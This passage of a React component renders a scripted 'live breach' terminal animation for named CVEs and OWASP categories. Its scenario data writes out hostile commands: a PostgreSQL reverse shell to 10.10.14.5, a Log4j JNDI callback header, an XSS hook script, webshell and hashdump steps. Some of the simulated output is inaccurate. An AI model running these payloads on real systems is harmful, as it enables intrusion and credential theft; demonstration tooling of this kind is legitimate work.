"use client";
import React, { useState, useEffect, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal, Cpu, Zap, Activity, Shield, X, ArrowRight, Server, Globe, Lock, Play, RotateCcw, AlertTriangle, Video, Square, Download } from 'lucide-react';
import { useScreenRecorder } from '../hooks/useScreenRecorder';

const BreachSimulator = ({ isOpen, onClose, targetData }) => {
  const [phase, setPhase] = useState('RECON'); 
  const [terminalLines, setTerminalLines] = useState([]);
  const [logs, setLogs] = useState([]);
  const [isSimulating, setIsSimulating] = useState(false);
  const [packets, setPackets] = useState([]);
  const terminalEndRef = useRef(null);

  // Recording Integration
  const { startRecording, stopRecording, isRecording } = useScreenRecorder();

  const getScenario = () => {
    const cve = (targetData?.cve_id || targetData?.cve || '').toLowerCase();
    const name = (targetData?.name || '').toLowerCase();
    const owasp = (targetData?.owasp || targetData?.owasp_category || '').toLowerCase();
    
    if (cve.includes('cve-2024-6387') || name.includes('regresshion') || name.includes('ssh')) return 'REGRESSHION';
    if (cve.includes('cve-2017-0144') || name.includes('eternalblue') || name.includes('smb')) return 'ETERNALBLUE';
    if (cve.includes('cve-2019-0708') || name.includes('bluekeep') || name.includes('rdp')) return 'BLUEKEEP';
    if (cve.includes('cve-2011-2523') || name.includes('vsftpd') || name.includes('ftp')) return 'VSFTPD';
    if (cve.includes('cve-2020-10188') || name.includes('telnet')) return 'TELNET';
    if (cve.includes('cve-2012-2122') || name.includes('mysql')) return 'MYSQL';
    if (cve.includes('cve-2019-9193') || name.includes('postgresql')) return 'POSTGRESQL';
    if (cve.includes('cve-2014-0160') || name.includes('heartbleed')) return 'HEARTBLEED';
    if (cve.includes('cve-2022-22965') || name.includes('spring4shell')) return 'SPRING4SHELL';
    if (cve.includes('cve-2021-44228') || name.includes('log4j') || name.includes('log4shell')) return 'LOG4J';
    
    if (name.includes('sql') || owasp.includes('injection')) return 'SQL_INJECTION';
    if (name.includes('xss') || name.includes('cross-site')) return 'CROSS_SITE_SCRIPTING';
    if (name.includes('access control') || owasp.includes('a01')) return 'BROKEN_ACCESS_CONTROL';
    if (name.includes('crypto') || owasp.includes('a02')) return 'BROKEN_CRYPTOGRAPHY';
    return 'LOG4J'; // Default
  };

  const scenarios = {
    REGRESSHION: {
        BOOT: {
            command: "hexashield --init --vuln-db=exploit-db",
            output: ["[  0.000000] Linux version 5.15.0-kali7", "[*] Syncing EDB-52055.py intelligence...", "[*] Target: " + (targetData?.target || '127.0.0.1')],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -sV -p 22 ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Checking SSH daemon port...", "[+] PORT 22/tcp OPEN (OpenSSH 9.2p1 Debian-2+deb12u2)", "[!] VULN CONFIRMED: CVE-2024-6387 (RegreSSHion Race Condition)"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `python3 EDB-52055.py --target ${targetData?.target || '127.0.0.1'} --port 22 --lhost 10.10.14.5`,
            output: ["[*] Preparing glibc memory alignment payload...", "[*] Crafting SSH signal handler race condition timing loop...", "[SUCCESS] Exploit payload structure compiled."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "python3 EDB-52055.py --run-fuzzer",
            output: ["[*] Sending public key packets to trigger memory allocation...", "[*] Initiating race condition timing loop (retrying block)..."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "nc -lvnp 4444",
            output: ["[*] Listening on 0.0.0.0:4444...", "[+] Connection received from " + (targetData?.target || '127.0.0.1') + "!", "[SUCCESS] Spawning root shell context (sshd child process)"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && id",
            output: ["root", "uid=0(root) gid=0(root) groups=0(root)", "[!] MISSION ACCOMPLISHED: OpenSSH server fully compromised (Root shell active)."],
            next: null
        }
    },
    ETERNALBLUE: {
        BOOT: {
            command: "msfconsole -q",
            output: ["[*] Starting Metasploit Framework...", "[*] Loading module: exploit/windows/smb/ms17_010_eternalblue"],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p 445 --script smb-vuln-ms17-010 ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Scanning port 445 for SMBv1 protocols...", "[+] Host supports vulnerable SMBv1 protocol.", "[!] VULN CONFIRMED: MS17-010 (EternalBlue) Remote Code Execution"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `set RHOSTS ${targetData?.target || '127.0.0.1'} && set LHOST 10.10.14.5`,
            output: ["RHOSTS => " + (targetData?.target || '127.0.0.1'), "LHOST => 10.10.14.5", "[*] Generating ring 0 kernel shellcode payload..."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "exploit",
            output: ["[*] Connecting to SMBv1 endpoint...", "[*] Allocating pool memory layout for kernel override...", "[*] Sending EternalBlue raw packet chain..."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "use exploit/windows/smb/ms17_010_eternalblue",
            output: ["[+] Pool grooming succeeded. Kernel payload deployed.", "[*] Spawning Meterpreter thread inside lsass.exe process...", "[SUCCESS] Meterpreter session 1 opened (10.10.14.5:4444 -> " + (targetData?.target || '127.0.0.1') + ":49158)"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "getuid && sysinfo",
            output: ["Server Username: NT AUTHORITY\\SYSTEM", "OS: Windows Server 2012 R2", "[!] MISSION ACCOMPLISHED: SYSTEM privilege established via EternalBlue."],
            next: null
        }
    },
    BLUEKEEP: {
        BOOT: {
            command: "msfconsole -q",
            output: ["[*] Starting Metasploit Framework...", "[*] Loading module: exploit/windows/rdp/cve_2019_0708_bluekeep"],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p 3389 --script rdp-vuln-ms12-020 ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Analyzing RDP channel handling...", "[+] Port 3389 RDP is open.", "[!] VULN CONFIRMED: CVE-2019-0708 (BlueKeep) Heap Corruption"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `set RHOSTS ${targetData?.target || '127.0.0.1'} && set TARGET 1`,
            output: ["RHOST => " + (targetData?.target || '127.0.0.1'), "TARGET => Windows 7 SP1 / 2008 R2", "[*] Crafting MS_T120 channel corruption payload..."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "exploit",
            output: ["[*] Initiating RDP protocol handshake...", "[*] Binding virtual channel: MS_T120...", "[*] Sending targeted kernel channel allocation payload..."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "sessions -i 1",
            output: ["[+] Grooming kernel heap space... Success.", "[*] Transferring kernel shellcode block...", "[SUCCESS] Session 1 (Meterpreter) opened to " + (targetData?.target || '127.0.0.1')],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "getuid && hashdump",
            output: ["NT AUTHORITY\\SYSTEM", "Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::", "[!] MISSION ACCOMPLISHED: Remote Desktop service fully compromised."],
            next: null
        }
    },
    VSFTPD: {
        BOOT: {
            command: "python3 EDB-49757.py --help",
            output: ["[*] vsFTPd 2.3.4 Backdoor Trigger script.", "[*] Loading netcat helper library..."],
            next: 'RECON'
        },
        RECON: {
            command: `nc -vn ${targetData?.target || '127.0.0.1'} 21`,
            output: ["(UNKNOWN) [" + (targetData?.target || '127.0.0.1') + "] 21 (ftp) open", "[+] Banner: 220 (vsFTPd 2.3.4)", "[!] VULN CONFIRMED: vsFTPd 2.3.4 Backdoor Signature"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `python3 EDB-49757.py --target ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Targeting: " + (targetData?.target || '127.0.0.1') + ":21", "[*] Constructing trigger packet sequence (USER anonymous:)...", "[SUCCESS] Trigger packet payload armed."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: `curl ftp://${targetData?.target || '127.0.0.1'}:21/`,
            output: ["[*] Sending trigger username: USER anonymous:)", "[*] Sending trigger password: PASS anonymous", "[+] Backdoor signal sent successfully."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: `nc -vn ${targetData?.target || '127.0.0.1'} 6200`,
            output: ["[*] Connecting to backdoor port 6200...", "[+] Connection established! Backdoor shell active.", "[SUCCESS] Spawning backdoor terminal..."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && cat /etc/hostname",
            output: ["root", "ftp-server-prod", "[!] MISSION ACCOMPLISHED: Backdoor shell connected (Root access)."],
            next: null
        }
    },
    TELNET: {
        BOOT: {
            command: "hexashield --payload telnet-overflow",
            output: ["[*] Initializing Telnet Buffer Overflow payload...", "[*] Syncing CVE-2020-10188 exploit parameters..."],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p 23 -sV ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Probing Telnet port...", "[+] PORT 23/tcp OPEN (telnetd)", "[!] VULN CONFIRMED: CVE-2020-10188 Remote Buffer Overflow"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `python3 telnet_overflow.py --target ${targetData?.target || '127.0.0.1'} --lhost 10.10.14.5`,
            output: ["[*] Generating shellcode buffer...", "[*] Pad size: 2048 bytes. Payload size: 256 bytes.", "[SUCCESS] Overflow buffer structure generated."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "python3 telnet_overflow.py --run",
            output: ["[*] Sending malicious option subnegotiation string...", "[*] Injecting terminal type environment variables...", "[+] Remote telnetd buffer corrupted."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "nc -lvnp 4444",
            output: ["listening on [any] 4444 ...", "[+] Connection from " + (targetData?.target || '127.0.0.1') + " received!", "[SUCCESS] Telnet daemon process hijacked (Reverse Shell active)."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && uname -a",
            output: ["root", "Linux hostname 4.19.0-openwrt", "[!] MISSION ACCOMPLISHED: Reverse shell spawned under Root permissions."],
            next: null
        }
    },
    MYSQL: {
        BOOT: {
            command: "mysql --version",
            output: ["mysql  Ver 15.1 Distrib 10.5.12-MariaDB", "[*] Syncing CVE-2012-2122 flood-bypass tool..."],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p 3306 -sV ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Scanning database port...", "[+] PORT 3306/tcp OPEN (MySQL 5.5.23)", "[!] VULN CONFIRMED: CVE-2012-2122 Password Bypass Vulnerability"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `python3 mysql_bypass.py --target ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Initializing auth flood sequence...", "[*] Targeting user 'root' on MySQL server...", "[SUCCESS] Flood process armed."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "python3 mysql_bypass.py --run",
            output: ["[*] Starting auth loop (attempting wrong password flood)...", "[*] Sent 100 authentication packets...", "[*] Sent 200 authentication packets..."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: `mysql -u root -h ${targetData?.target || '127.0.0.1'} -pwrong_password`,
            output: ["[+] Authenticated bypassed on attempt 241!", "[SUCCESS] Logged in successfully (root@localhost)", "Welcome to the MySQL monitor."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "show databases; select user();",
            output: ["+--------------------+", "| Database           |", "+--------------------+", "| information_schema |", "| mysql              |", "| production_db      |", "+--------------------+", "root@localhost", "[!] MISSION ACCOMPLISHED: Full Database Administrator privilege bypass."],
            next: null
        }
    },
    POSTGRESQL: {
        BOOT: {
            command: "psql --version",
            output: ["psql (PostgreSQL) 11.5", "[*] Initializing Program COPY Execution vectors..."],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p 5432 -sV ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Scanning database port...", "[+] PORT 5432/tcp OPEN (PostgreSQL 11.2)", "[!] VULN CONFIRMED: CVE-2019-9193 Command Execution via COPY"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `psql -h ${targetData?.target || '127.0.0.1'} -U postgres`,
            output: ["[*] Connecting with default postgres superuser...", "[SUCCESS] PostgreSQL shell active. Preparing payload commands..."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);",
            output: ["DROP TABLE", "CREATE TABLE", "[+] Command execution table ready in public schema."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "COPY cmd_exec FROM PROGRAM 'nc -e /bin/sh 10.10.14.5 4444';",
            output: ["[*] Triggering FROM PROGRAM shell command...", "[*] Sending database instruction...", "[SUCCESS] Command execution completed."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "nc -lvnp 4444",
            output: ["listening on [any] 4444 ...", "[+] connection from " + (targetData?.target || '127.0.0.1') + " received!", "postgres", "uid=109(postgres) gid=115(postgres) groups=115(postgres)", "[!] MISSION ACCOMPLISHED: OS Command Execution achieved via PostgreSQL database."],
            next: null
        }
    },
    HEARTBLEED: {
        BOOT: {
            command: "sslyze --version",
            output: ["SSLyze version 5.0.0", "[*] Syncing ssl_heartbleed.py script..."],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p 443 --script ssl-heartbleed ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Connecting to HTTPS port...", "[+] PORT 443/tcp OPEN (OpenSSL 1.0.1f)", "[!] VULN CONFIRMED: CVE-2014-0160 (Heartbleed) SSL Extension Leak"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `python3 ssl_heartbleed.py ${targetData?.target || '127.0.0.1'} -p 443 --lhost 10.10.14.5`,
            output: ["[*] Constructing TLS Heartbeat ClientHello packet...", "[*] Setting heartbeat payload request size to 65535...", "[SUCCESS] Heartbleed leak packet structured."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "python3 ssl_heartbleed.py --leak",
            output: ["[*] Sending TLS ClientHello with Heartbeat extension...", "[*] Receiving SSL heartbleed response packet...", "[+] Memory leak returned successfully! Checking buffer..."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "python3 ssl_heartbleed.py --dump",
            output: ["----------------- LEAKED SSL MEMORY DUMP --------------------", "0000: 02 40 00 d8 03 02 53 43 52 45 54 5f 4b 45 59 3d  .@....SECRET_KEY=", "0010: 61 64 6d 69 6e 5f 70 61 73 73 3d 73 75 70 65 72  admin_pass=super", "0020: 73 65 63 75 72 65 31 32 33 0d 0a 43 6f 6f 6b 69  secure123..Cooki", "-------------------------------------------------------------", "[SUCCESS] Extracted sensitive plain-text parameters from TLS memory."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "grep -oE \"admin_pass=\\w+\" memory_dump.bin",
            output: ["admin_pass=supersecure123", "[!] MISSION ACCOMPLISHED: Session passwords leaked from live OpenSSL daemon memory."],
            next: null
        }
    },
    SPRING4SHELL: {
        BOOT: {
            command: "hexashield --payload spring4shell",
            output: ["[*] Syncing spring4shell_exploit.py intelligence...", "[*] Setting endpoint context mapping..."],
            next: 'RECON'
        },
        RECON: {
            command: `curl -I http://${targetData?.target || '127.0.0.1'}:8080/`,
            output: ["[*] Checking HTTP server header...", "[+] Server: Apache Tomcat/9.0.58", "[!] VULN CONFIRMED: CVE-2022-22965 (Spring4Shell) RCE via Class Loader Routing"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: `python3 spring4shell_exploit.py --url http://${targetData?.target || '127.0.0.1'}:8080/ --lhost 10.10.14.5`,
            output: ["[*] Preparing class loader override instruction...", "[*] Mapping tomcat pipeline configurations...", "[SUCCESS] JSP back-door trigger payload prepared."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "python3 spring4shell_exploit.py --run",
            output: ["[*] Executing payload class rewrite query parameters...", "[*] Writing JSP webshell payload: webapp/tomcat.jsp...", "[SUCCESS] Tomcat log writing successfully hijacked."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: `curl http://${targetData?.target || '127.0.0.1'}:8080/tomcat.jsp?cmd=whoami`,
            output: ["[*] Querying deployed backdoor shell...", "[+] Response: tomcat", "[SUCCESS] Remote Command Execution verified on target server."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: `curl http://${targetData?.target || '127.0.0.1'}:8080/tomcat.jsp?cmd=cat%20/etc/passwd`,
            output: ["tomcat:x:1001:1001::/home/tomcat:/bin/sh", "[!] MISSION ACCOMPLISHED: RCE achieved in Spring container namespace (tomcat user level)."],
            next: null
        }
    },
    LOG4J: {
        BOOT: {
            command: "hexashield --init --vuln-db=exploit-db",
            output: ["[  0.000000] Linux version 5.15.0-kali7", "[*] Syncing EDB-50592.py intelligence...", "[*] Target: " + (targetData?.target || '127.0.0.1')],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -sV --script http-vuln-cve2021-44228 ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Starting Discovery Scan...", "[+] PORT 8080/tcp OPEN (Apache Log4j)", "[!] VULN CONFIRMED: CVE-2021-44228 (RCE via JNDI)"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "python3 EDB-50592.py --lhost 10.10.14.5 --lport 4444",
            output: ["[*] Crafting JNDI reference payload...", "[*] Source: https://www.exploit-db.com/exploits/50592", "[SUCCESS] Strike package compiled."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: `curl -H 'User-Agent: \$\{jndi:ldap://10.10.14.5:1389/Exploit\}' http://${targetData?.target || 'target'}:8080/`,
            output: ["[*] Injecting payload into HTTP headers...", "[+] JNDI Callback initiated to 10.10.14.5:1389"],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "nc -lvnp 4444 (Listening Link: http://10.10.14.5:4444/rev_shell)",
            output: ["listening on [any] 4444 ...", "[+] Connection from " + (targetData?.target || '127.0.0.1') + " received!", "[SUCCESS] Shell spawned (uid=0)"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && ip addr show",
            output: ["root", "inet 172.17.0.2/16", "[!] MISSION ACCOMPLISHED: TARGET SYSTEM COMPROMISED."],
            next: null
        }
    },
    SQL_INJECTION: {
        BOOT: {
            command: "sqlmap --version --update",
            output: ["sqlmap/1.6.2 - automatic SQL injection tool", "[*] Synchronizing EDB-46635 intelligence..."],
            next: 'RECON'
        },
        RECON: {
            command: `sqlmap -u "http://${targetData?.target || '127.0.0.1'}/dashboard/auth.php?id=1" --batch`,
            output: ["[*] Testing 'id' parameter...", "[+] GET parameter 'id' is vulnerable (UNION based).", "[!] Source: https://www.exploit-db.com/exploits/46635"],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "sqlmap --dbms=MySQL --level=3 --risk=2 --dbs",
            output: ["[*] Probing schema via boolean-blind...", "[+] [2] databases:", "[-] information_schema", "[-] hexashield_auth"],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "sqlmap -D hexashield_auth --tables --columns",
            output: ["[*] Decoding 'users' column architecture...", "[SUCCESS] Found (id, username, password_hash, role)"],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "sqlmap -D hexashield_auth -T users -C password_hash --dump",
            output: ["[*] Extracting credential blobs...", "[SUCCESS] Data dumped to CSV.", "[+] admin: $2y$10$7f8... (Listening Link: http://10.10.14.5:9090/pwned_creds)"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "cat /tmp/sqlmap_results.csv",
            output: ["admin, b3c4a1782e, SUPERUSER", "[!] MISSION ACCOMPLISHED: SENSITIVE DATA EXFILTRATED."],
            next: null
        }
    },
    CROSS_SITE_SCRIPTING: {
        BOOT: {
            command: "beef-xss --init --vuln-db=edb",
            output: ["[*] Starting BeEF Framework...", "[*] Syncing EDB-44497 (Stored XSS)..."],
            next: 'RECON'
        },
        RECON: {
            command: `nmap -p80 --script http-xssed ${targetData?.target || '127.0.0.1'}`,
            output: ["[*] Analyzing DOM for injection sinks...", "[!] VULN FOUND: https://www.exploit-db.com/exploits/44497", "[+] Vector identified in 'search_query' field."],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "cat edb_44497_payload.js",
            output: ["[*] Payload: <script src='http://10.10.14.5:3000/hook.js'></script>", "[SUCCESS] Persistence script ready."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: `curl -d "search_query=<script src='http://10.10.14.5:3000/hook.js'></script>" http://${targetData?.target || 'target'}/search`,
            output: ["[*] Delivering persistent hook via POST...", "[+] Victim browser effectively hooked."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "beef-console (Listening Link: http://10.10.14.5:3000/ui/panel)",
            output: ["[*] Waiting for zombie session...", "[SUCCESS] Zombie 1 (IP: " + (targetData?.target || 'target') + ") ACTIVE.", "[+] Capturing auth tokens..."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "beef > zombies 1 execute get_all_cookies",
            output: ["[+] PHPSESSID=7f82b3c4a1d9e2f5...", "[!] MISSION ACCOMPLISHED: BROWSER SESSION HIJACKED."],
            next: null
        }
    },
    BROKEN_ACCESS_CONTROL: {
        BOOT: {
            command: "gobuster dir -u http://" + (targetData?.target || '127.0.0.1'),
            output: ["[*] Starting directory brute-force...", "[*] Using common.txt wordlist"],
            next: 'RECON'
        },
        RECON: {
            command: "gobuster > /admin/ [302 Found]",
            output: ["[*] Testing /admin/ endpoint...", "[!] ACCESS GRANTED: Endpoint /admin/settings bypasses role check."],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "curl -H 'Cookie: role=user' http://target/admin/settings",
            output: ["[*] Probing IDOR vulnerability...", "[+] Parameter 'user_id=1' reveals sensitive config."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "curl -X POST -d 'role=admin' http://target/api/update_user/1",
            output: ["[*] Attempting Privilege Escalation...", "[SUCCESS] User ID 1 role updated to 'ADMIN'"],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "ssh admin@target",
            output: ["[*] Connecting to newly escalated account...", "[SUCCESS] Login successful. Private shell established."],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "whoami && cat /root/flag",
            output: ["root", "FLAG{BROKEN_ACCESS_CONTROL_WIN}", "[!] MISSION ACCOMPLISHED: FULL PRIVILEGE ESCALATION."],
            next: null
        }
    },
    BROKEN_CRYPTOGRAPHY: {
        BOOT: {
            command: "sslyze --regular " + (targetData?.target || '127.0.0.1') + ":443",
            output: ["[*] Analyzing SSL/TLS configuration...", "[*] Cipher Suite Analysis started."],
            next: 'RECON'
        },
        RECON: {
            command: "sslyze > TLSv1.0 [VULNERABLE]",
            output: ["[!] Vulnerability: Weak Protocol TLS 1.0 enabled.", "[!] Heartbleed (SSLv3) detected on target."],
            next: 'WEAPON'
        },
        WEAPON: {
            command: "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
            output: ["[*] Cracking MD5 password hashes...", "[*] Dictionary attack in progress..."],
            next: 'DELIVERY'
        },
        DELIVERY: {
            command: "openssl s_client -connect target:443 -tlsv1",
            output: ["[*] Intercepting weak crypto handshake...", "[SUCCESS] Handshake successful using vulnerable cipher."],
            next: 'EXPLOIT'
        },
        EXPLOIT: {
            command: "hashcat > admin:123456",
            output: ["[*] Recovering plaintext from weak hash...", "[SUCCESS] MD5 Decrypted: b3c4a... -> 'password123'"],
            next: 'IMPACT'
        },
        IMPACT: {
            command: "hexashield --verify --crypto",
            output: ["[*] Verifying decrypted credentials...", "[!] MISSION ACCOMPLISHED: CRYPTOGRAPHIC SECRETS DECODED."],
            next: null
        }
    }
  };

  useEffect(() => {
    if (terminalEndRef.current) {
        terminalEndRef.current.scrollIntoView({ behavior: 'smooth' });
    }
  }, [terminalLines]);

  const addLog = (msg, type = 'info') => {
    const time = new Date().toLocaleTimeString([], { hour12: false, minute: '2-digit', second: '2-digit' });
    setLogs(prev => [...prev, { time, msg, type }]);
  };

  const simulatePhase = async (currentPhase) => {
    const activeScenario = getScenario();
    const data = scenarios[activeScenario][currentPhase];
    if (!data) return;

    setPhase(currentPhase);
    addLog(`Initiating ${currentPhase} phase...`, 'process');
    
    // Type out command
    let typed = "";
    for (let i = 0; i < data.command.length; i++) {
        typed += data.command[i];
        setTerminalLines(prev => [...prev.slice(0, -1), `> ${typed}`]);
        if (i === 0) setTerminalLines(prev => [...prev, `> `]);
        await new Promise(r => setTimeout(r, 30));
    }

    // Process output
    for (const out of data.output) {
        await new Promise(r => setTimeout(r, 400));
        setTerminalLines(prev => [...prev, out]);
        
        // Trigger packet visuals for delivery/exploit
        if (currentPhase === 'DELIVERY' || currentPhase === 'EXPLOIT') {
            setPackets(prev => [...prev, { id: Date.now(), direction: 'out' }]);
            setTimeout(() => setPackets(prev => prev.filter(p => p.id !== Date.now())), 1000);
        }
    }

    addLog(`${currentPhase} completed successfully.`, 'success');

    if (data.next) {
        await new Promise(r => setTimeout(r, 1000));
        simulatePhase(data.next);
    } else {
        setIsSimulating(false);
        addLog("Attack simulation finalized.", 'success');
        // Auto-stop recording when mission is accomplished
        if (isRecording) {
            setTimeout(stopRecording, 2000);
        }
    }
  };

  const startSimulation = async (withRecording = false) => {
    if (withRecording) {
        const success = await startRecording();
        if (!success) return; // User cancelled or permission denied
    }

    setTerminalLines([]);
    setLogs([]);
    setIsSimulating(true);
    simulatePhase('BOOT');
  };

  return (
    <AnimatePresence>
      {isOpen && (
        <>
          <motion.div
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/90 backdrop-blur-xl z-[200]"
          />
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.9 }}
            className="fixed top-[54%] left-[58%] -translate-x-1/2 -translate-y-1/2 w-full max-w-6xl h-[80vh] bg-[#050505] border border-white/10 rounded-[2rem] overflow-hidden z-[201] flex flex-col shadow-[0_0_50px_rgba(0,0,0,1)]"
          >
            {/* Header */}
            <div className="p-6 border-b border-white/5 flex items-center justify-between bg-black/40">
              <div className="flex items-center gap-4">
                <div className="p-3 bg-red-500/10 rounded-2xl border border-red-500/30">
                  <Activity className="text-red-500 animate-pulse" size={20} />
                </div>
                <div>
                  <h3 className="text-xl font-semibold text-white tracking-tight">Live Breach Simulation</h3>
                  <p className="text-xs text-gray-500 font-medium">Target: {targetData?.target || 'Operational Node'}</p>
                </div>
              </div>
              <div className="flex items-center gap-6">
                 {!isSimulating && terminalLines.length === 0 && (
                    <div className="flex gap-2">
                       <button 
                          onClick={() => startSimulation(false)}
                          className="flex items-center gap-3 px-6 py-2.5 bg-white/5 border border-white/10 hover:bg-white/10 text-white rounded-xl text-sm font-semibold transition-all"
                       >
                          <Play size={14} /> Start
                       </button>
                       <button 
                          onClick={() => startSimulation(true)}
                          className="flex items-center gap-3 px-6 py-2.5 bg-red-600 hover:bg-red-700 text-white rounded-xl text-sm font-semibold transition-all shadow-[0_0_20px_rgba(220,38,38,0.4)]"
                       >
                          <Video size={14} /> Record & Run
                       </button>
                    </div>
                 )}
                 <button onClick={onClose} className="p-2 hover:bg-white/5 rounded-full text-gray-600 transition-colors">
                    <X size={24} />
                 </button>
              </div>
            </div>

            <div className="flex-1 flex overflow-hidden">
              {/* Center: Animated Terminal (The Master Console) */}
              <div className="flex-1 flex flex-col bg-black/40 terminal-crt relative group">
                {/* Visual Glitch Frame */}
                <div className="absolute inset-0 border border-cyber-blue/10 pointer-events-none group-hover:border-cyber-blue/30 transition-colors duration-700" />
                
                <div className="flex items-center justify-between px-8 py-5 border-b border-white/5 bg-black/60 relative z-20">
                    <div className="flex items-center gap-3">
                        <Terminal size={14} className="text-cyber-blue" />
                        <span className="text-sm font-semibold text-gray-400">Terminal</span>
                    </div>
                    
                    {isRecording && (
                       <div className="flex items-center gap-2 px-4 py-1.5 bg-red-500/10 border border-red-500/30 rounded-full shadow-[0_0_15px_rgba(239,68,68,0.2)]">
                          <div className="w-2 h-2 rounded-full bg-red-600 animate-flicker" />
                          <span className="text-xs font-semibold text-red-500">Recording</span>
                       </div>
                    )}

                    <div className="flex items-center gap-4">
                        <div className="flex gap-1.5">
                            <div className="w-2 h-2 rounded-full bg-red-500/30" />
                            <div className="w-2 h-2 rounded-full bg-yellow-500/30" />
                            <div className="w-2 h-2 rounded-full bg-green-500/30" />
                        </div>
                        <span className="text-[10px] font-mono text-cyber-blue/80 font-bold">ROOT@{targetData?.target || 'HEXASHIELD'}:~#</span>
                    </div>
                </div>
                
                <div className="flex-1 p-10 overflow-y-auto font-mono text-[13px] cyber-scrollbar space-y-4 relative z-10 selection:bg-cyber-blue/30">
                   {terminalLines.map((line, i) => (
                     <motion.div 
                        initial={{ opacity: 0, x: -10 }}
                        animate={{ opacity: 1, x: 0 }}
                        key={i} 
                        className={`flex gap-6 ${
                            line.startsWith('>') ? 'text-cyber-blue font-black' : 
                            (line.includes('[SUCCESS]') || line.includes('[+]') || line.includes('READY')) ? 'text-cyber-neon drop-shadow-[0_0_5px_#39FF14]' : 
                            (line.startsWith('[!]') || line.includes('MISSION')) ? 'text-red-500 font-black animate-pulse' : 
                            line.startsWith('[  ') ? 'text-gray-600 italic text-[11px]' : // Kernel logs style
                            'text-white/90'
                        }`}
                     >
                        <span className="opacity-10 shrink-0 w-10 select-none font-bold">{(i + 1).toString().padStart(3, '0')}</span>
                        <span className="break-all tracking-tight leading-relaxed">{line}</span>
                     </motion.div>
                   ))}
                   <div ref={terminalEndRef} />
                </div>

                {/* Packet Relay (Moved further right and down for optimal visibility) */}
                <div className="absolute bottom-6 right-6 w-48 h-64 bg-black/80 border border-white/5 rounded-3xl backdrop-blur-md z-30 p-4 flex flex-col items-center justify-between shadow-2xl">
                    <div className="text-[7px] font-semibold text-gray-500 uppercase tracking-widest text-center mt-2">Relay Monitor</div>
                    
                    <div className="flex flex-col items-center gap-2">
                        <Cpu size={16} className="text-cyber-blue" />
                        <div className="h-12 w-[1px] bg-white/10 relative">
